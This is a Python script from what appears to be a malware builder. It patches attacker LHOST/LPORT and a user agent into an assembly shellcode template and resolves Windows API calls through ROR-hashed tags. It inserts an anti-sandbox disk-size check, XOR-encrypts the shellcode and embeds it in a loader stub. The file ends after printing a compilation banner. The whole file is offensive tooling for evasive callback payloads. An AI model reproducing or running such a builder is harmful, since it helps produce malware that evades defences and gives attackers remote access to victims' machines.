from configparser import ConfigParser
from scripts.ROR import hash
from scripts.config import parse_config
from scripts.utils import *
import random
import sys

config = ConfigParser()
config.read(".conf") 

# CONFIG = parse_config(config)

ROR_VALUE = config.getint("Payload", "ror_value")
ENCRYPTION_KEY = config.get("Payload", "encryption_key")
PAYLOAD_FILE = config.get("Payload", "file")

# MODE = config.get("Payload","mode")
LHOST = config.get("Payload", "lhost")
LPORT = config.getint("Payload", "lport")
USER_AGENT = config.get("Payload","user_agent")

STUB_FILE = config.get("Stub", "filename")

DISK_SIZE = config.get("Anti-Analysis", "disk_size")

WORKING_FOLDER = "temp/"


def main():

    if config.get("Payload", "encryption_key") == "rand":
        ENCRYPTION_KEY = random.randint(0, 0xFFFF)
    else:
        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)

    print("===========CONFIG==========")
    print(f"ROR value: {ROR_VALUE}")
    print(f"Encryption byte: {ENCRYPTION_KEY}")
    print("===========================\n")

    print("===========PAYLOAD==============")
    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
        
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))

        if LHOST.count(".") == 3:
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))

    all_tags = extract_tags_from_folder(WORKING_FOLDER)

    for file in all_tags:
        filename = file["filename"]
        tags = file["tags"]
        # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
        for tag in tags:
            parts = tag.replace("%", "").split("__")
            if parts[0] == "HASH":
                sed_file(WORKING_FOLDER+filename, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
            if parts[0] == "MODHASH":
                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
            if parts[0] == "FCTHASH":
                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
            if parts[0] == "RANDOM":
                # Générer une valeur aléatoire de 32 bits
                dword_value = random.randint(0, 0xFFFFFFF)
                sed_file(WORKING_FOLDER+filename, tag, hex(dword_value))
            if parts[0] == "SANDBOX":
                if parts[1] == "DISKSIZE":
                    sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)

    # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash

    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
        instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)




    elif PAYLOAD_FILE.endswith(".exe"):
        instructions = pe2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    else:
        print("Unknown file format of the payload")
        sys.exit(1)
    nb_bytes = int(len(instructions)/2)
    print(f"Shellcode length: {nb_bytes} bytes")
    print("================================\n")

    # Encrypt the shellcode
    print("===========ENCRYPTION==============")
    print(instructions)
    print(f"\nEncrypted with '{ENCRYPTION_KEY}'\n")
    encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
    print(encrypted_instructions)
    print("===================================\n")
    sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
    sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))

    

    print("\n================COMPILATION===============")


if __name__ == "__main__":
    main()